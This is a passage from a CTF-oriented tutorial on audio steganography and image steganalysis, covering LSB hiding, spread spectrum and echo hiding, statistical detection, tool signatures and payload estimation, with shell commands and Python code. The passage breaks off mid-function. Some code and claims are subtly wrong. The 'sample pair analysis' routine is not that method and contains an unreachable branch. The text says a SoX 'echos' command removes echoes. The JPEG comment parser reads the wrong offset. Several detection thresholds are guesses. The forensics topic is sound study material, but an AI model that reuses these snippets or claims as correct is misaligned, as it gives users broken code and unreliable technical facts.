Audio steganography involves concealing data within audio files by exploiting properties of digital audio formats and human auditory perception. In CTF contexts, these techniques frequently appear in forensics challenges where competitors must detect, extract, and decode hidden information from audio samples.

### LSB Audio Hiding

Least Significant Bit (LSB) substitution in audio files embeds data by replacing the least significant bits of audio samples with message bits. This technique exploits the fact that modifications to LSBs produce minimal perceptible changes to audio quality.

#### Technical Foundation

Audio files consist of discrete samples representing amplitude at specific time intervals. In a 16-bit audio sample, the LSB contributes approximately 0.0015% to the overall amplitude. Modifying these bits introduces imperceptible noise while providing a covert channel for data transmission.

**Capacity calculation**: For a WAV file with sample rate *R* Hz, bit depth *B* bits, duration *T* seconds, and *C* channels:
```
Capacity (bits) = R × T × C × n
```
where *n* = number of LSBs used per sample (typically 1-2)

Example: CD-quality audio (44.1 kHz, 16-bit, stereo, 60 seconds) using 1 LSB per sample:
```
44,100 × 60 × 2 × 1 = 5,292,000 bits ≈ 661 KB capacity
```

#### Detection and Extraction Tools

**WavSteg** (Python-based LSB encoder/decoder):
```bash
## Install
git clone https://github.com/ragibson/Steganography
cd Steganography
pip3 install -r requirements.txt

## Extract hidden data
python3 LSBSteg.py decode -i audio.wav -o extracted.txt

## Encode data (for testing)
python3 LSBSteg.py encode -i clean.wav -s secret.txt -o stego.wav -n 2
```
The `-n` parameter specifies number of LSBs to use (1-2 recommended for audio).

**Sonic Visualiser** (visual waveform/spectrogram analysis):
```bash
## Install on Kali
sudo apt install sonic-visualiser

## Launch with audio file
sonic-visualiser suspicious.wav
```
Within Sonic Visualiser:
1. Layer → Add Spectrogram (Shift+G) - reveals frequency domain patterns
2. Layer → Add Peak Frequency Spectrogram - highlights dominant frequencies
3. Inspect waveform for anomalous high-frequency noise patterns indicating LSB modifications

**DeepSound** (Windows-focused GUI tool):
```bash
## Run through Wine on Kali
wine DeepSound.exe
```
[Unverified]: DeepSound's exact LSB implementation algorithm is not publicly documented.

#### Manual Analysis with Python

```python
import wave
import numpy as np

def extract_lsb(audio_path, output_path, num_lsb=1):
    """Extract LSB data from WAV file"""
    wav = wave.open(audio_path, 'rb')
    frames = wav.readframes(wav.getnframes())
    wav.close()
    
    ## Convert to numpy array
    audio_data = np.frombuffer(frames, dtype=np.int16)
    
    ## Extract LSBs
    mask = (1 << num_lsb) - 1
    extracted_bits = audio_data & mask
    
    ## Convert bits to bytes
    bit_string = ''.join([bin(b)[2:].zfill(num_lsb) for b in extracted_bits])
    extracted_bytes = bytearray([int(bit_string[i:i+8], 2) 
                                  for i in range(0, len(bit_string), 8)])
    
    with open(output_path, 'wb') as f:
        f.write(extracted_bytes)

## Usage
extract_lsb('challenge.wav', 'output.bin', num_lsb=1)
```

**Statistical Detection** - Chi-square analysis for LSB randomness:
```python
from scipy import stats

def detect_lsb_stego(audio_path):
    """Statistical test for LSB steganography"""
    wav = wave.open(audio_path, 'rb')
    frames = wav.readframes(wav.getnframes())
    audio_data = np.frombuffer(frames, dtype=np.int16)
    
    ## Extract LSBs
    lsbs = audio_data & 1
    
    ## Count bit frequencies
    observed = [np.sum(lsbs == 0), np.sum(lsbs == 1)]
    expected = [len(lsbs) / 2, len(lsbs) / 2]
    
    ## Chi-square test (p < 0.05 suggests non-random LSBs)
    chi2, p_value = stats.chisquare(observed, expected)
    return p_value

## p-value close to 0 indicates possible steganography
p = detect_lsb_stego('suspicious.wav')
print(f"P-value: {p:.6f}")
```

#### Format-Specific Considerations

**WAV files**: Uncompressed, ideal for LSB embedding. Header structure (44 bytes for standard PCM):
```bash
## Examine WAV header
xxd -l 44 audio.wav

## Bytes 0-3: "RIFF"
## Bytes 22-23: Number of channels
## Bytes 24-27: Sample rate
## Bytes 34-35: Bit depth
```

**MP3/OGG files**: Lossy compression destroys naive LSB embedding. [Inference]: These formats require specialized steganography targeting quantized DCT coefficients rather than sample LSBs.

### Spread Spectrum Steganography

Spread spectrum techniques distribute hidden data across the frequency spectrum of the audio signal, embedding information in a way that mimics noise. This provides robustness against signal processing operations and statistical detection.

#### Direct Sequence Spread Spectrum (DSSS)

DSSS multiplies the message signal with a pseudo-random noise (PRN) sequence, spreading the message energy across a wide bandwidth. The receiver uses the same PRN sequence to extract the message.

**Mathematical basis**:
```
S(t) = C(t) × PN(t)
```
where:
- S(t) = spread signal
- C(t) = carrier audio signal  
- PN(t) = pseudo-random noise sequence

**Characteristics**:
- Embedded data appears as low-amplitude noise
- Requires synchronized PRN sequence for extraction (key-based)
- Resistant to signal processing (compression, filtering, resampling)

#### Frequency Hopping Spread Spectrum (FHSS)

FHSS rapidly switches the carrier frequency according to a pseudo-random pattern, embedding data bits at different frequencies over time.

**Implementation approach**:
1. Divide message into segments
2. Map each segment to frequency band based on PRN sequence
3. Embed weak signal component at designated frequencies
4. Receiver uses same PRN to determine frequency hop pattern

#### Detection and Extraction

**Spectrum analysis approach**:
```bash
## Generate spectrogram with high resolution
sox audio.wav -n spectrogram -o spectrum.png -x 4000 -y 513 -z 120

## Parameters:
## -x: width in pixels (higher = better time resolution)
## -y: height in pixels (higher = better frequency resolution)  
## -z: dynamic range in dB
```

Look for:
- Consistent low-amplitude noise floor elevation
- Periodic frequency patterns not matching audio content
- Abnormal energy distribution in high frequencies

**Correlation detection** (requires known PRN sequence or brute force):
```python
import numpy as np
from scipy.signal import correlate

def extract_dsss(audio_data, prn_sequence, chip_rate):
    """
    Extract DSSS hidden message using known PRN sequence
    
    audio_data: numpy array of audio samples
    prn_sequence: PRN sequence used for spreading (±1 values)
    chip_rate: samples per chip
    """
    ## Correlate audio with PRN sequence
    correlation = correlate(audio_data, prn_sequence, mode='valid')
    
    ## Sample correlation at chip rate
    extracted_bits = correlation[::chip_rate] > 0
    
    return extracted_bits.astype(int)
```

**Tools**:

[Unverified]: No widely-documented open-source CTF tools specifically target spread spectrum audio steganography. Manual analysis with signal processing libraries (NumPy, SciPy) is typically required.

**StegHide** (can embed in audio, though primarily uses different technique):
```bash
## Attempt extraction with passphrase
steghide extract -sf audio.wav -p password

## Get file information
steghide info audio.wav
```

#### CTF Scenario Approaches

1. **Blind detection**: Analyze spectrogram for unusual noise patterns across time/frequency
2. **Known sequence**: If PRN sequence or pattern hinted in challenge, implement correlation-based extraction
3. **Key enumeration**: Common PRN generators use simple seeds - brute force small keyspaces
4. **Frequency analysis**: FHSS leaves characteristic "hopping" patterns in time-frequency plots

### Echo Hiding

Echo hiding embeds data by introducing imperceptible echoes into the audio signal. The time delay, amplitude, and phase of echoes encode binary information. Human auditory system cannot distinguish echoes with delays under ~5ms from the original signal.

#### Technical Methodology

**Single echo encoding**:
- Delay < 1ms: imperceptible as distinct echo, perceived as resonance
- Binary 0: echo delay δ₀ (e.g., 0.5ms)
- Binary 1: echo delay δ₁ (e.g., 1.0ms)
- Echo amplitude: typically 0.5-0.8 relative to original signal

**Mathematical representation**:
```
y(t) = x(t) + α × x(t - δ)
```
where:
- x(t) = original audio signal
- α = echo amplitude (0 < α < 1)
- δ = echo delay (encodes bit value)

**Multiple echo encoding** (higher capacity):
- Encode multiple bits using echo kernels with different delays
- Allows embedding multiple data bits per audio segment

#### Detection Techniques

**Cepstrum analysis** - most effective method for echo detection:

The cepstrum reveals periodicity in the frequency spectrum, making echoes appear as peaks.

```python
import numpy as np
from scipy.fftpack import fft, ifft

def cepstrum_analysis(audio_data, sample_rate):
    """
    Compute cepstrum to detect echo delays
    
    Returns: cepstrum and quefrency axis (time-like domain)
    """
    ## Compute power spectrum
    spectrum = np.abs(fft(audio_data))
    
    ## Compute cepstrum (IFFT of log spectrum)
    log_spectrum = np.log(spectrum + 1e-10)  ## avoid log(0)
    cepstrum = np.abs(ifft(log_spectrum))
    
    ## Quefrency axis (time in samples)
    quefrency = np.arange(len(cepstrum)) / sample_rate
    
    return cepstrum, quefrency

## Usage
import wave
wav = wave.open('audio.wav', 'rb')
audio = np.frombuffer(wav.readframes(wav.getnframes()), dtype=np.int16)
sample_rate = wav.getframerate()

ceps, quef = cepstrum_analysis(audio[:sample_rate], sample_rate)

## Plot to identify echo delays
import matplotlib.pyplot as plt
plt.plot(quef[:len(quef)//2] * 1000, ceps[:len(ceps)//2])  ## convert to ms
plt.xlabel('Quefrency (ms)')
plt.ylabel('Cepstrum Magnitude')
plt.title('Cepstrum - Echo Detection')
plt.savefig('cepstrum.png')
```

Peaks in the cepstrum at specific quefrencies indicate echo delays. Look for peaks in the 0.5-5ms range.

**Autocorrelation method**:
```python
def detect_echo_autocorr(audio_data, max_delay_samples):
    """Detect echoes using autocorrelation"""
    autocorr = np.correlate(audio_data, audio_data, mode='full')
    autocorr = autocorr[len(autocorr)//2:]  ## positive lags only
    
    ## Normalize
    autocorr = autocorr / autocorr[0]
    
    ## Find peaks (potential echo delays)
    from scipy.signal import find_peaks
    peaks, properties = find_peaks(autocorr[:max_delay_samples], 
                                   height=0.3, distance=10)
    
    return peaks, autocorr

## Example: detect echoes up to 100 samples delay
peaks, autocorr = detect_echo_autocorr(audio, max_delay_samples=100)
print(f"Potential echo delays (samples): {peaks}")
print(f"Delays (ms): {peaks / sample_rate * 1000}")
```

#### Extraction Process

1. **Segment audio**: Divide into frames (e.g., 1024-4096 samples)
2. **Compute cepstrum** for each frame
3. **Identify echo delays**: Find peaks at known or suspected delay values
4. **Decode bits**: Map detected delays to binary values (δ₀ → 0, δ₁ → 1)
5. **Reconstruct message**: Concatenate extracted bits, decode to text/file

**Echo removal and extraction combined**:
```python
def extract_echo_data(audio_path, delay0_ms, delay1_ms, threshold=0.3):
    """
    Extract binary data encoded in echo delays
    
    delay0_ms: delay in ms representing bit 0
    delay1_ms: delay in ms representing bit 1
    threshold: cepstrum peak threshold
    """
    wav = wave.open(audio_path, 'rb')
    audio = np.frombuffer(wav.readframes(wav.getnframes()), dtype=np.int16)
    sample_rate = wav.getframerate()
    wav.close()
    
    ## Convert delays to samples
    delay0_samples = int(delay0_ms * sample_rate / 1000)
    delay1_samples = int(delay1_ms * sample_rate / 1000)
    
    frame_size = 2048
    extracted_bits = []
    
    for i in range(0, len(audio) - frame_size, frame_size):
        frame = audio[i:i+frame_size]
        ceps, _ = cepstrum_analysis(frame, sample_rate)
        
        ## Check magnitude at expected delays
        mag0 = ceps[delay0_samples] if delay0_samples < len(ceps) else 0
        mag1 = ceps[delay1_samples] if delay1_samples < len(ceps) else 0
        
        if mag0 > threshold or mag1 > threshold:
            bit = 0 if mag0 > mag1 else 1
            extracted_bits.append(bit)
    
    ## Convert bits to bytes
    bit_string = ''.join(map(str, extracted_bits))
    bytes_data = bytearray([int(bit_string[i:i+8], 2) 
                            for i in range(0, len(bit_string), 8)])
    
    return bytes_data

## Usage example
data = extract_echo_data('challenge.wav', delay0_ms=0.5, delay1_ms=1.0)
with open('extracted.bin', 'wb') as f:
    f.write(data)
```

#### Tools and Resources

**Audacity** (manual echo visualization):
```bash
audacity challenge.wav
```
Analysis steps:
1. Select all audio (Ctrl+A)
2. Analyze → Plot Spectrum (enhanced resolution)
3. Look for periodic patterns indicating echoes
4. Effect → Echo (to test echo parameters)

**SoX** (Sox - Sound eXchange, command-line audio processing):
```bash
## Apply echo effect (for testing/validation)
sox input.wav output.wav echo 0.8 0.7 500 0.3

## Parameters: gain-in gain-out delay decay
## delay in milliseconds

## Remove echo (if parameters known)
sox input.wav output.wav echos 0.8 0.7 500 0.3 1000 0.3
```

**MATLAB/Octave** (for advanced signal processing):
```octave
% Read audio
[audio, fs] = audioread('challenge.wav');

% Compute cepstrum
spectrum = fft(audio);
log_spectrum = log(abs(spectrum) + eps);
cepstrum = ifft(log_spectrum);

% Plot
quefrency = (0:length(cepstrum)-1) / fs * 1000; % ms
plot(quefrency(1:500), abs(cepstrum(1:500)));
xlabel('Quefrency (ms)');
ylabel('Magnitude');
```

#### CTF Practical Considerations

**Common challenge patterns**:
- Echo delays provided as hint (e.g., "the answer echoes at 0.8ms")
- Dual delay encoding requiring discrimination between two delay values
- Multi-bit echo kernels using 3+ distinct delays
- Combination with other techniques (LSB + echo)

**Extraction workflow**:
1. **Initial reconnaissance**: `file`, `mediainfo`, `exiftool` to verify format
2. **Spectrogram inspection**: Look for unusual patterns
3. **Cepstrum analysis**: Systematic search for echo signatures
4. **Parameter estimation**: If delays unknown, sweep common ranges (0.2-5ms)
5. **Decoding**: Extract bits, try various encoding schemes (ASCII, Base64, binary file)

[Inference]: Echo hiding is less commonly implemented than LSB in CTF challenges due to complexity, but appears in advanced audio forensics scenarios.

---

**Key takeaways for CTF audio steganography**:

1. **Always start with basic analysis**: file type verification, metadata examination, waveform/spectrogram visualization
2. **LSB is most common**: Try automated tools (WavSteg, steghide) before manual analysis  
3. **Spread spectrum requires signal processing knowledge**: Be prepared to implement custom extraction if PRN sequence is hinted
4. **Echo hiding**: Cepstrum analysis is the definitive detection method
5. **Combine techniques**: Many challenges layer multiple steganography methods
6. **File format matters**: Compression destroys LSB data; echo survives lossy compression better

---

## Steganalysis

Steganalysis is the art and science of detecting hidden information within carrier files—the adversarial counterpart to steganography. In CTF contexts, steganalysis involves identifying whether a file contains concealed data, determining the steganographic method used, and extracting the hidden payload. This requires understanding statistical properties of clean files, recognizing tool-specific signatures, and estimating payload characteristics.

### Statistical Detection

Statistical detection methods analyze the mathematical properties of files to identify anomalies that suggest the presence of hidden data. Steganography inevitably alters statistical distributions in carrier files, creating detectable artifacts.

#### Fundamental Statistical Properties

**Chi-Square Analysis**

The chi-square test measures how much observed byte value distributions deviate from expected distributions in clean files. Steganographic embedding typically flattens these distributions.

```bash
## Using stegdetect for chi-square analysis on JPEG files
stegdetect -t j suspicious_image.jpg

## Verbose output showing statistical metrics
stegdetect -tjV suspicious_image.jpg

## Batch analysis of multiple files
stegdetect -t jopi *.jpg > stegdetect_results.txt
```

The `-t` flag specifies detection methods: `j` (jsteg), `o` (outguess), `p` (jphide), `i` (invisible secrets). [Inference: stegdetect primarily targets JPEG steganography methods based on its documented functionality]

**Histogram Analysis**

Examine pixel value distributions for irregularities. LSB steganography creates characteristic patterns in the least significant bits.

```bash
## Generate histogram with ImageMagick
convert image.png -define histogram:unique-colors=false histogram:histogram.png

## Analyze LSB plane specifically
convert image.png -depth 1 -colorspace Gray lsb_plane.png

## Python-based histogram analysis
python3 << EOF
from PIL import Image
import numpy as np
import matplotlib.pyplot as plt

img = Image.open('suspicious_image.png')
pixels = np.array(img)

## Extract LSB plane
lsb = pixels & 1

## Check for randomness (should be ~50% ones in natural images)
ratio = np.sum(lsb) / lsb.size
print(f"LSB bit ratio: {ratio:.4f}")

## Visual histogram of LSB values
plt.hist(lsb.flatten(), bins=2)
plt.savefig('lsb_histogram.png')
EOF
```

**Pairs of Values (PoV) Analysis**

LSB embedding creates statistical relationships between adjacent pixel values. The PoV method detects message length by analyzing these pairs.

```bash
## Install and use stegexpose for PoV analysis
git clone https://github.com/b3dk7/StegExpose
cd StegExpose
./configure && make

## Run PoV analysis
./stegexpose suspicious_image.png output_directory/

## The tool outputs probability estimates for steganographic content
```

**Sample Pair Analysis (SPA)**

SPA examines pairs of adjacent pixels and their LSBs to estimate hidden message length with higher accuracy than chi-square for LSB steganography.

```python
#!/usr/bin/env python3
## spa_detector.py - Sample Pair Analysis implementation
from PIL import Image
import numpy as np

def sample_pair_analysis(image_path):
    img = Image.open(image_path)
    pixels = np.array(img).flatten()
    
    ## Count sample pairs
    x = 0  ## Both LSBs equal
    y = 0  ## LSBs differ by 1
    z = 0  ## LSBs differ by more than 1
    
    for i in range(0, len(pixels)-1, 2):
        p1, p2 = pixels[i], pixels[i+1]
        diff = abs((p1 & 1) - (p2 & 1))
        
        if diff == 0:
            x += 1
        elif diff == 1:
            y += 1
        else:
            z += 1
    
    ## Calculate estimated message length
    ## [Inference: Formula based on statistical theory of LSB embedding]
    if y > 0:
        ratio = x / y
        estimated_percentage = (ratio - 1) / (ratio + 1) * 100
        print(f"Estimated embedded data: {estimated_percentage:.2f}% of capacity")
    else:
        print("No significant LSB embedding detected")

if __name__ == "__main__":
    import sys
    sample_pair_analysis(sys.argv[1])
```

```bash
chmod +x spa_detector.py
./spa_detector.py suspicious_image.png
```

**RS (Regular-Singular) Analysis**

RS steganalysis categorizes pixel groups as regular or singular based on how flipping LSBs affects smoothness metrics. LSB steganography disrupts the natural ratio.

```bash
## Using aletheia for RS analysis
pip3 install aletheia

## RS steganalysis on image
aletheia rs suspicious_image.png

## Analyze entire directory
aletheia rs-batch images_directory/
```

#### Advanced Statistical Techniques

**Wavelet-Based Detection**

Discrete Wavelet Transform (DWT) analysis detects steganography in frequency domain, effective against transform-domain hiding methods.

```python
#!/usr/bin/env python3
## dwt_steganalysis.py
import pywt
import numpy as np
from PIL import Image

def dwt_analysis(image_path):
    img = Image.open(image_path).convert('L')
    pixels = np.array(img, dtype=float)
    
    ## Perform 2D DWT
    coeffs = pywt.dwt2(pixels, 'haar')
    cA, (cH, cV, cD) = coeffs
    
    ## Analyze high-frequency components for anomalies
    ## Natural images have specific statistical properties in wavelet domain
    stats = {
        'horizontal_std': np.std(cH),
        'vertical_std': np.std(cV),
        'diagonal_std': np.std(cD),
        'detail_energy': np.sum(cH**2 + cV**2 + cD**2)
    }
    
    print("Wavelet Domain Statistics:")
    for key, val in stats.items():
        print(f"  {key}: {val:.4f}")
    
    ## [Inference: Higher than expected std dev in high-freq components suggests embedding]
    if stats['detail_energy'] > np.mean([stats['horizontal_std'], 
                                          stats['vertical_std']]) * 1000000:
        print("\n⚠ Potential steganographic content detected in frequency domain")

if __name__ == "__main__":
    import sys
    dwt_analysis(sys.argv[1])
```

**Structural Similarity Index (SSIM)**

Compare suspected stego files against expected statistical models or known clean versions.

```bash
## Using ImageMagick to compare images
compare -metric SSIM original.png suspected_stego.png difference.png

## Lower SSIM values suggest more modification
## [Inference: Typical SSIM > 0.95 for minor JPEG artifacts, < 0.90 may indicate manipulation]

## Python alternative with scikit-image
python3 << EOF
from skimage.metrics import structural_similarity as ssim
from PIL import Image
import numpy as np

img1 = np.array(Image.open('original.png'))
img2 = np.array(Image.open('suspected_stego.png'))

score = ssim(img1, img2, channel_axis=2)
print(f"SSIM Score: {score:.4f}")
EOF
```

### Signature Analysis

Signature analysis identifies steganographic tools by detecting tool-specific artifacts, header modifications, or embedding patterns unique to particular implementations.

#### Tool-Specific Signatures

**Steghide Detection**

Steghide embeds data in JPEG and BMP files with characteristic patterns in the embedding process.

```bash
## Attempt steghide extraction without password (detects format)
steghide extract -sf suspicious.jpg
## If it prompts for passphrase, steghide was likely used

## Check for steghide magic bytes and structure
hexdump -C suspicious.jpg | grep -A5 -B5 "steghide"

## Analyze JPEG comments (steghide may modify these)
exiftool suspicious.jpg | grep -i comment

## Python signature detection
python3 << EOF
with open('suspicious.jpg', 'rb') as f:
    data = f.read()
    
    ## Check for steghide-specific patterns
    ## [Unverified: These patterns may vary by steghide version]
    if b'steghide' in data.lower():
        print("⚠ Steghide signature found in file")
    
    ## JPEG comment section check (0xFFFE marker)
    if b'\xff\xfe' in data:
        idx = data.index(b'\xff\xfe')
        length = int.from_bytes(data[idx+1:idx+3], 'big')
        comment = data[idx+3:idx+3+length]
        print(f"JPEG Comment: {comment}")
EOF
```

**OpenStego Signatures**

OpenStego uses specific algorithms that leave detectable patterns, particularly in PNG files.

```bash
## Check PNG chunk structures
pngcheck -v suspicious.png

## OpenStego uses custom embedding in IDAT chunks
## Extract and analyze IDAT chunks
python3 << EOF
import struct

with open('suspicious.png', 'rb') as f:
    data = f.read()
    
    ## PNG signature check
    if data[:8] != b'\x89PNG\r\n\x1a\n':
        print("Not a valid PNG")
        exit()
    
    ## Parse chunks
    pos = 8
    while pos < len(data):
        length = struct.unpack('>I', data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]
        chunk_data = data[pos+8:pos+8+length]
        crc = data[pos+8+length:pos+12+length]
        
        if chunk_type == b'IDAT':
            ## Analyze IDAT data entropy
            import math
            byte_counts = [chunk_data.count(bytes([i])) for i in range(256)]
            entropy = -sum((c/length) * math.log2(c/length) 
                          for c in byte_counts if c > 0)
            print(f"IDAT entropy: {entropy:.4f}")
            ## [Inference: Higher entropy (>7.5) suggests embedded data]
        
        pos += 12 + length
EOF
```

**F5 Algorithm Detection**

F5 is a JPEG steganography algorithm that modifies DCT coefficients. It has specific statistical signatures.

```bash
## Using stegdetect with F5-specific detection
stegdetect -t f5 suspicious.jpg

## Manual F5 signature analysis
python3 << EOF
from PIL import Image
import numpy as np
from scipy.fftpack import dct, idct

img = Image.open('suspicious.jpg')
img_array = np.array(img)

## F5 modifies DCT coefficients in a specific pattern
## Check for characteristic histogram shrinkage
## [Inference: F5 causes coefficient histogram asymmetry]

def analyze_dct_blocks(img_array):
    blocks = []
    for i in range(0, img_array.shape[0]-8, 8):
        for j in range(0, img_array.shape[1]-8, 8):
            block = img_array[i:i+8, j:j+8]
            dct_block = dct(dct(block.T, norm='ortho').T, norm='ortho')
            blocks.append(dct_block)
    
    ## Analyze coefficient distribution
    all_coeffs = np.concatenate([b.flatten() for b in blocks])
    zeros = np.sum(all_coeffs == 0)
    total = len(all_coeffs)
    print(f"Zero DCT coefficients: {zeros/total*100:.2f}%")
    ## F5 increases zero coefficients ratio

analyze_dct_blocks(img_array[:,:,0])  ## Analyze Y channel
EOF
```

**LSB Signature Patterns**

Different LSB tools have unique implementation details that create signatures.

```bash
## Generic LSB plane extraction and analysis
python3 << EOF
from PIL import Image
import numpy as np

def extract_lsb_signature(image_path):
    img = Image.open(image_path)
    arr = np.array(img)
    
    ## Extract LSB plane from each channel
    lsb_r = arr[:,:,0] & 1 if len(arr.shape) == 3 else arr & 1
    
    ## Sequential pattern check (common in simple LSB tools)
    sequential = 0
    for i in range(1, lsb_r.size):
        if lsb_r.flat[i] == lsb_r.flat[i-1]:
            sequential += 1
    
    seq_ratio = sequential / lsb_r.size
    print(f"Sequential bit ratio: {seq_ratio:.4f}")
    
    ## [Inference: Ratio < 0.45 or > 0.55 suggests non-random embedding]
    if seq_ratio < 0.45 or seq_ratio > 0.55:
        print("⚠ Non-random LSB pattern detected")
    
    ## Check for tool-specific headers in extracted bits
    ## Many tools embed length or format markers
    bits = lsb_r.flatten()[:64]  ## First 64 bits
    byte_string = ''.join(str(b) for b in bits)
    print(f"First 64 LSB bits: {byte_string}")

extract_lsb_signature('suspicious.png')
EOF
```

#### File Format Anomalies

**Header Inconsistencies**

Steganography tools sometimes modify file headers in detectable ways.

```bash
## Comprehensive header analysis
exiftool -a -G1 suspicious.jpg

## Check for mismatched dimensions or metadata
identify -verbose suspicious.jpg | grep -E "dimension|geometry|size"

## Compare file size to expected size based on dimensions
python3 << EOF
from PIL import Image
import os

img = Image.open('suspicious.jpg')
actual_size = os.path.getsize('suspicious.jpg')
expected_size = img.width * img.height * len(img.getbands())

## JPEG compression typically achieves 10:1 ratio
expected_compressed = expected_size // 10

print(f"Actual: {actual_size} bytes")
print(f"Expected: ~{expected_compressed} bytes")

if actual_size > expected_compressed * 1.5:
    print("⚠ File suspiciously large - may contain hidden data")
EOF
```

**Trailing Data Detection**

Many tools append data after the file format's EOF marker.

```bash
## Check for data after JPEG EOI marker (0xFFD9)
xxd suspicious.jpg | grep -A20 "ffd9"

## Automated trailing data extraction
python3 << EOF
def extract_trailing_data(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    
    ## JPEG EOI marker
    eoi = b'\xff\xd9'
    ## PNG IEND chunk
    iend = b'IEND\xae\x42\x60\x82'
    ## GIF trailer
    gif_end = b'\x00\x3b'
    
    markers = {'JPEG': eoi, 'PNG': iend, 'GIF': gif_end}
    
    for format_name, marker in markers.items():
        if marker in data:
            idx = data.rfind(marker)
            trailing = data[idx + len(marker):]
            if len(trailing) > 0:
                print(f"{format_name} format detected")
                print(f"Trailing data: {len(trailing)} bytes")
                print(f"First 64 bytes (hex): {trailing[:64].hex()}")
                
                ## Save for analysis
                with open(f'trailing_data.bin', 'wb') as out:
                    out.write(trailing)
                return trailing
    return None

extract_trailing_data('suspicious.jpg')
EOF

## Analyze extracted trailing data
file trailing_data.bin
strings trailing_data.bin
binwalk trailing_data.bin
```

**Metadata Manipulation**

Some tools hide data in EXIF, IPTC, or XMP metadata fields.

```bash
## Extract all metadata
exiftool -a -u -g1 suspicious.jpg > metadata.txt

## Check for unusual or oversized metadata fields
exiftool -b -UserComment suspicious.jpg > usercomment.bin
xxd usercomment.bin

## Python-based metadata analysis
python3 << EOF
from PIL import Image
from PIL.ExifTags import TAGS

img = Image.open('suspicious.jpg')
exif = img._getexif()

if exif:
    for tag_id, value in exif.items():
        tag = TAGS.get(tag_id, tag_id)
        if isinstance(value, bytes) and len(value) > 100:
            print(f"⚠ Large binary data in {tag}: {len(value)} bytes")
            print(f"  First 32 bytes: {value[:32].hex()}")
EOF
```

### Payload Estimation

Payload estimation determines the size and characteristics of hidden data without full extraction, useful for prioritizing analysis efforts and validating extraction attempts.

#### Capacity Calculation

**LSB Capacity**

```python
#!/usr/bin/env python3
## lsb_capacity.py
from PIL import Image
import sys

def calculate_lsb_capacity(image_path, bits_per_pixel=1):
    """
    Calculate theoretical LSB embedding capacity
    bits_per_pixel: number of LSB planes used (1-8)
    """
    img = Image.open(image_path)
    width, height = img.size
    channels = len(img.getbands())
    
    ## Total bits available
    total_bits = width * height * channels * bits_per_pixel
    
    ## Convert to bytes
    total_bytes = total_bits // 8
    
    print(f"Image: {image_path}")
    print(f"Dimensions: {width}x{height}, Channels: {channels}")
    print(f"LSB planes used: {bits_per_pixel}")
    print(f"Maximum capacity: {total_bytes:,} bytes ({total_bytes/1024:.2f} KB)")
    
    ## Account for typical overhead (length headers, etc.)
    ## [Inference: Most tools use 32-64 bits for length encoding]
    usable_capacity = total_bytes - 8  ## 64 bits overhead
    print(f"Estimated usable capacity: {usable_capacity:,} bytes")
    
    return total_bytes

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <image_file> [bits_per_pixel]")
        sys.exit(1)
    
    bpp = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    calculate_lsb_capacity(sys.argv[1], bpp)
```

```bash
chmod +x lsb_capacity.py
./lsb_capacity.py suspicious.png 1
```

**JPEG DCT Capacity**

```python
#!/usr/bin/env python3
## jpeg_capacity.py
import sys
from PIL import Image
import numpy as np
from scipy.fftpack import dct

def estimate_jpeg_capacity(image_path):
    """
    Estimate steganographic capacity in JPEG DCT domain
    """
    img = Image.open(image_path)
    arr = np.array(img)
    
    if len(arr.shape) == 3:
        ## Use luminance channel
        arr = arr[:,:,0]
    
    ## Count 8x8 blocks
    blocks_h = arr.shape[0] // 8
    blocks_v = arr.shape[1] // 8
    total_blocks = blocks_h * blocks_v
    
    ## Each block has 64 DCT coefficients
    ## Typically, only non-DC coefficients used for embedding
    ## [Inference: F5 and similar algorithms use ~50-60% of AC coefficients]
    usable_coeffs_per_block = 40  ## Conservative estimate
    
    ## Assume 1 bit per coefficient (typical for quality preservation)
    total_bits = total_blocks * usable_coeffs_per_block
    total_bytes = total_bits // 8
    
    print(f"JPEG Capacity Estimation:")
    print(f"  8x8 blocks: {total_blocks:,}")
    print(f"  Usable coefficients: ~{usable_coeffs_per_block} per block")
    print(f"  Estimated capacity: {total_bytes:,} bytes ({total_bytes/1024:.2f} KB)")
    
    return total_bytes

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <jpeg_file>")
        sys.exit(1)
    estimate_jpeg_capacity(sys.argv[1])
```

#### Length Extraction

Many steganography tools embed message length in the first bytes of hidden data.

```python
#!/usr/bin/env python3
## extract_length_header.py
from PIL import Image
import numpy as np
import struct

def extract_length_from_lsb(image_path, length_bits=32):
    """
    Extract length header from LSB-embedded data
    length_bits: number of bits used for length encoding (usually 32 or 64)
    """
    img = Image.open(image_path)
    arr = np.array(img)
    
    ## Flatten and extract LSBs
    if len(arr.shape) == 3:
        flat = arr[:,:,0].flatten()  ## Use first channel
    else:
        flat = arr.flatten()
    
    lsb_bits = flat[:length_bits] & 1
    
    ## Convert bits to integer
    bit_string = ''.join(str(b) for b in lsb_bits)
    length = int(bit_string, 2)
    
    print(f"Extracted length header: {length} bytes")
    print(f"As hex: 0x{length:08x}")
    
    ## Validate length reasonability
    max_capacity = (flat.size // 8) - (length_bits // 8)
    if 0 < length < max_capacity:
        print(f"✓ Length appears valid (max capacity: {max_capacity} bytes)")
        return length
    else:
        print(f"⚠ Length seems invalid or no header present")
        
        ## Try reverse bit order (some tools use different endianness)
        bit_string_rev = bit_string[::-1]
        length_rev = int(bit_string_rev, 2)
        print(f"Reversed bit order: {length_rev} bytes")
        if 0 < length_rev < max_capacity:
            print("✓ Reversed order appears valid")
            return length_rev
        
        return None

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <image_file> [length_bits]")
        sys.exit(1)
    
    bits = int(sys.argv[2]) if len(sys.argv) > 2 else 32
    extract_length_from_lsb(sys.argv[1], bits)
```

#### Entropy Analysis for Payload Size

Calculate entropy of extracted data to estimate actual payload size versus random noise.

```python
#!/usr/bin/env python3
## entropy_payload_estimation.py
import math
from collections import Counter
from PIL import Image
import numpy as np

def calculate_entropy(data):
    """Calculate Shannon entropy of byte sequence"""
    if len(data) == 0:
        return 0
    
    counter = Counter(data)
    entropy = 0
    for count in counter.values():
        probability = count / len(data)
        entropy -= probability * math.log2(probability)
    
    return entropy

def estimate_payload_by_entropy(image_path, block_size=1024):
    """
    Estimate payload size by analyzing entropy changes across the image
    Higher entropy regions likely contain compressed/encrypted payload
    """
    img = Image.open(image_path)
    arr = np.array(img)
    
    if len(arr.shape) == 3:
        arr = arr[:,:,0]
    
    lsb_data = (arr.flatten() & 1).astype(np.uint8)
    
    ## Analyze entropy in blocks
    entropy_values = []
